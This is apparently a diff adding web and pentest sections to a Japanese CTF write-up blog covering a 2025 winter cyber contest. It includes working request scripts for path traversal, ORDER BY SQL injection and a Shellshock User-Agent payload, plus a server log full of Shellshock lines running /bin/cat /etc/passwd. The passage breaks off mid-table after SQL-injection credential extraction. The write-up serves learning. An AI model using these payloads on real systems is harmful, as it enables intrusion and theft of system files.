@@ -508,7 +508,292 @@ flagSeedパラメータの値に応じて1~2の文字が返されます。<br>
 <pre tabindex="0"><code>114,47,0,53,0,95,0,71,6,19,39
 </code></pre><p>なのでこれがフラグになります。</p>
 <pre tabindex="0"><code>flag{114,47,0,53,0,95,0,71,6,19,39}
-</code></pre>
+</code></pre><h2 id="we">WE</h2>
+<h3 id="簡単には見せません">簡単には見せません</h3>
+<p>Webサイトからフラグを取り出す問題です。<br>
+とりあえず情報が少ないので/robots.txtを見てみます。</p>
+<pre tabindex="0"><code>User-Agent:*
+Disallow:/
+Disallow:/red/
+Disallow:/gold/
+Disallow:/yellow/
+Disallow:/blue/
+Disallow:/pink/
+Disallow:/black/
+</code></pre><p>これらのディレクトリがあったので、1つずつ見ていきます。<br>
+/blueにflgというディレクトリがあったので見てみると、そこにフラグが書かれていました。</p>
+<pre tabindex="0"><code>flag{TakeMeToTheFlag}
+</code></pre><h3 id="試練を乗り越えろ">試練を乗り越えろ！</h3>
+<p>質問に対して回答を送ることで、次の問題へと移るサイトです。<br>
+10000問解ければフラグがもらえるようです。<br>
+URLをよく見てみると</p>
+<pre tabindex="0"><code>qCount=1&amp;answer=1
+</code></pre><p>というデータがPOSTされていました。<br>
+qCount、answer共に同じ数値が入ります。<br>
+例えば一問目はqCount=1&amp;answer=1で正解となりました。<br>
+このことから、1万問目に正解するにはqCount=10000&amp;answer=10000とすれば良さそうです。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>(<span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">baseUrl</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://we2-prod.2025winter-cybercontest.net/&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">baseUrl</span>, {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;qCount=10000&amp;answer=10000&amp;submit=submit&#34;</span>
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">text</span>());
+</span></span><span style="display:flex;"><span>})();
+</span></span></code></pre></div><p>これを送るとフラグがもらえました。</p>
+<pre tabindex="0"><code>flag{WinThroughTheGame}
+</code></pre><h3 id="直してる最中なんです">直してる最中なんです</h3>
+<p>どうにかしてWebサーバ内の/etc/WE-3というファイルにアクセスする問題です。<br>
+サイトにアクセスすると複数の画像が表示されたページが出てきます。<br>
+ソースを見てみると、/secret/download.phpにリクエストを送り、ローカルに保存されている画像ファイルを取得していました。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$file_name <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#34;fName&#34;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$file_path <span style="color:#f92672">=</span> <span style="color:#a6e22e">dirname</span>(<span style="color:#66d9ef">__FILE__</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/&#39;</span><span style="color:#f92672">.</span>$file_name;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$download_file_name <span style="color:#f92672">=</span> $file_name;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Type: application/force-download;&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Length: &#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">filesize</span>($file_path));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Disposition: attachment; filename=&#34;&#39;</span><span style="color:#f92672">.</span>$file_name<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&#34;&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">readfile</span>($download_file_name);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>ユーザ入力に何もチェックが入っていないので、パストラバーサルの脆弱性があります。<br>
+以下のパスを/etc/WE-3にすることでフラグが格納されたファイルを読み込むことができました。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>(<span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">baseUrl</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://we3-prod.2025winter-cybercontest.net/&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">baseUrl</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;secret/download.php&#34;</span>, {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;fName=/etc/WE-3&#34;</span>
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">text</span>());
+</span></span><span style="display:flex;"><span>})();
+</span></span></code></pre></div><pre tabindex="0"><code>flag{fGrantUB56skBTlmF14mostFP}
+</code></pre><h3 id="直接聞いてみたら">直接聞いてみたら？</h3>
+<p>Webサイトに行くと名前、メールアドレス、電話番号、住所を表示するページに行きます。<br>
+HTTPリクエストの内容を見てみます。</p>
+<pre tabindex="0"><code>{&#34;name&#34;: &#34;name&#34;, &#34;value&#34;: &#34;on&#34;},
+{&#34;name&#34;: &#34;email&#34;, &#34;value&#34;: &#34;on&#34;},
+{&#34;name&#34;: &#34;tel&#34;, &#34;value&#34;: &#34;on&#34;},
+{&#34;name&#34;: &#34;address&#34;, &#34;value&#34;: &#34;on&#34;}
+</code></pre><p>というJSONのデータがPOSTされていました。<br>
+name、email、tel、addressが上記の4つの情報を対応しているようです。<br>
+ということでこのエンドポイントにフラグを直接聞いてみます。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>(<span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">res</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">baseUrl</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://we4-prod.2025winter-cybercontest.net/&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        {<span style="color:#e6db74">&#34;name&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;name&#34;</span>, <span style="color:#e6db74">&#34;value&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;on&#34;</span>},
+</span></span><span style="display:flex;"><span>        {<span style="color:#e6db74">&#34;name&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;email&#34;</span>, <span style="color:#e6db74">&#34;value&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;on&#34;</span>},
+</span></span><span style="display:flex;"><span>        {<span style="color:#e6db74">&#34;name&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;tel&#34;</span>, <span style="color:#e6db74">&#34;value&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;on&#34;</span>},
+</span></span><span style="display:flex;"><span>        {<span style="color:#e6db74">&#34;name&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;address&#34;</span>, <span style="color:#e6db74">&#34;value&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;on&#34;</span>},
+</span></span><span style="display:flex;"><span>        {<span style="color:#e6db74">&#34;name&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;flag&#34;</span>, <span style="color:#e6db74">&#34;value&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;on&#34;</span>}
+</span></span><span style="display:flex;"><span>    ];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">b64Payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">payload</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">baseUrl</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">session</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">headers</span>.<span style="color:#a6e22e">getSetCookie</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">baseUrl</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;json.php&#34;</span>, {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Cookie&#34;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session</span>
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`data=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">b64Payload</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">text</span>());
+</span></span><span style="display:flex;"><span>})();
+</span></span></code></pre></div><pre tabindex="0"><code>flag{ParameterHandlingError}
+</code></pre><h3 id="整列">整列！</h3>
+<p>フラグの情報がDBに格納されており、それをWebサイト越しに取得する問題です。<br>
+WEの中で一番面白かったです。<br>
+index.phpに行くとDBに保存されているであろうレコードが表示されたページが出てきます。<br>
+この情報からカラムはid、data、flagSeqの3つだと分かります。<br>
+ページ上で?sort=data+ASCなどとパラメータを指定することで並び替えを行うこともできます。<br>
+ですが、どうやってもレコードの数が少ないです。<br>
+例えば?sort=flagSeq+ASCで並び変えても最初の20行ぐらいしか出てきません。<br>
+ここでASCという文字に着目します。<br>
+これはMySQLのORDER BY句で使用される値です。<br>
+ここから内部で実行されるSQL文が推測できます。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;SELECT * FROM table ORDER BY &#34;</span> <span style="color:#f92672">.</span> $userQuery <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; LIMIT 20&#34;</span>);
+</span></span></code></pre></div><p>するとASCの最後にコメントアウトを行うと以下のようなSQL文になります。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> <span style="color:#66d9ef">table</span> <span style="color:#66d9ef">ORDER</span> <span style="color:#66d9ef">BY</span> flagSeq <span style="color:#66d9ef">ASC</span>;<span style="color:#75715e">-- LIMIT 20
+</span></span></span></code></pre></div><p>これで出力される行の数が少なくなる問題が解決できそうです。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>(<span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">jsdom</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;jsdom&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">res</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">baseUrl</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://we5-prod.2025winter-cybercontest.net/&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">baseUrl</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">session</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">headers</span>.<span style="color:#a6e22e">getSetCookie</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">baseUrl</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/index.php?sort=flagSeq+ASC;--&#34;</span>, {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;GET&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Cookie&#34;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">dom</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">jsdom</span>.<span style="color:#a6e22e">JSDOM</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">text</span>());
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">tbody</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dom</span>.<span style="color:#a6e22e">getElementsByTagName</span>(<span style="color:#e6db74">&#34;tbody&#34;</span>)[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">trows</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tbody</span>.<span style="color:#a6e22e">getElementsByTagName</span>(<span style="color:#e6db74">&#34;tr&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">trows</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">result</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">trows</span>[<span style="color:#a6e22e">i</span>].<span style="color:#a6e22e">getElementsByTagName</span>(<span style="color:#e6db74">&#34;td&#34;</span>)[<span style="color:#ae81ff">1</span>].<span style="color:#a6e22e">innerText</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">result</span>);
+</span></span><span style="display:flex;"><span>})();
+</span></span></code></pre></div><p>上記のスクリプトで出てきたフラグの断片を一文字ずつ連結させていき、フラグを完成させます。</p>
+<pre tabindex="0"><code>flag{6f24d2267d87b7b232ed0d6ed3ad2924}
+</code></pre><h2 id="pw">PW</h2>
+<h3 id="cve-2014-7169他">CVE-2014-7169他</h3>
+<p>Webサーバのログファイルが渡され、そこから攻撃ペイロードを組み立てて/etc/PW-1のファイルを読み取る問題です。<br>
+まずは問題文にあるCVEの概要を調べます。<br>
+どうやらcgiに関連するCVEのようです。<br>
+exploitdbに実際のexploitコードがあったので、見てみます。(<a href="https://www.exploit-db.com/exploits/34766">https://www.exploit-db.com/exploits/34766</a>)<br>
+以下はその一部を抜粋したものです。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$context <span style="color:#f92672">=</span> <span style="color:#a6e22e">stream_context_create</span>(
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">array</span>(
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#39;http&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(
+</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#39;method&#39;</span>  <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;GET&#39;</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#39;header&#39;</span>  <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;User-Agent: () { :;}; /bin/bash -c &#34;&#39;</span><span style="color:#f92672">.</span>$cmd<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&#34;&#39;</span>
+</span></span><span style="display:flex;"><span>		)
+</span></span><span style="display:flex;"><span>	)
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>exploitコードからUser-Agentヘッダにペイロードを埋め込めばいいことが分かります。<br>
+次にWebサーバのログファイルを見ていきます。</p>
+<pre tabindex="0"><code>192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/a.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/b.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/c.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/d.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/e.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/f.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/g.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/h.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/i.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/j.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/k.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/l.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/m.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/n.cgi HTTP/1.1&#34; 200 2007 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/o.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/p.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/q.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/r.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/s.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/t.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/u.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/v.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/x.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/y.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/z.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] &#34;GET /cgi-bin/v.cgi HTTP/1.1&#34; 404 453 &#34;-&#34; &#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd&#34;
+</code></pre><p>/cgi-bin/n.cgiだけレスポンスが長いことから、このcgiが怪しそうです。<br>
+後はログファイルにあるペイロードのコマンド部分を/etc/PW-1を読み取るコマンドに変更すれば攻撃コードの完成です。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>(<span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">baseUrl</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://pw1-prod.2025winter-cybercontest.net/&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">baseUrl</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;cgi-bin/n.cgi&#34;</span>, {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;GET&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;User-Agent&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/PW-1&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">text</span>());
+</span></span><span style="display:flex;"><span>})();
+</span></span></code></pre></div><pre tabindex="0"><code>flag{&gt;:(!shellshock!}
+</code></pre><h3 id="認証は認可の後">認証は認可の後</h3>
+<p>どうにかログインに成功して、フラグを取得する問題です。<br>
+最初にログインページに飛ぶので、まずは適当に値を入力してリクエストの内容を見てみます。</p>
+<pre tabindex="0"><code>POST /auth.php
+Content-Type: application/x-www-form-urlencoded
+
+name=test&amp;password=test&amp;pass-re=test
+</code></pre><p>これらのパラメータの値にSQLiがないか調べていると、nameパラメータにSQLを埋め込めることが分かりました。<br>
+そこから頑張ってテーブル内のクレデンシャルを抜き出していきます。<br>
+最終的に以下のようなクレデンシャルが抜き出せました。</p>
+<pre tabindex="0"><code>+-----+----------+--------------------+-------------+---------+
+| uid | uname    | name               | passwd      | secret  |
